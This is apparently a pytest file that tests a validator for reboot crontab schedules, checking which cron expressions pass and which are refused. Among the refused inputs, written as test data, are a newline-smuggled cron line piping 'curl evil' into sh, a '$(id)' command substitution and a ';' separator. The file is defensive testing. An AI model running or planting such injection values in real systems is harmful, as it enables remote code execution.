import pytest

from app.models.frame import normalize_reboot_crontab, reboot_crontab_error


@pytest.mark.parametrize(
    "crontab",
    ["0 4 * * *", "*/15 * * * *", "30 3 1,15 * MON-FRI", "0 4 * JAN sun", "@daily", "  0 4 * * *  "],
)
def test_reboot_crontab_accepts_cron_schedules(crontab):
    assert reboot_crontab_error(crontab) is None


@pytest.mark.parametrize(
    "crontab, reason",
    [
        ("", "empty"),
        ("0 4 * * * root", "five fields"),
        ("0 4 * *", "five fields"),
        ("0 4 * * *\n* * * * * root curl evil | sh", "single line"),
        ("0 4 * * *\r", None),  # trailing \r is stripped like other whitespace
        ("0 4 * * $(id)", "characters cron does not take"),
        ("0 4 * * ;", "characters cron does not take"),
        ("@reboot", "every boot"),
    ],
)
def test_reboot_crontab_refuses_what_the_cron_line_cannot_carry(crontab, reason):
    error = reboot_crontab_error(crontab)
    if reason is None:
        assert error is None
    else:
        assert error is not None and reason in error


def test_normalize_reboot_crontab_falls_back_for_an_unsafe_stored_value():
    assert normalize_reboot_crontab("0 4 * * *\n* * * * * root x") == "0 0 * * *"
    assert normalize_reboot_crontab("0 4 * * * root", default="0 3 * * *") == "0 3 * * *"
    assert normalize_reboot_crontab("@weekly") == "@weekly"
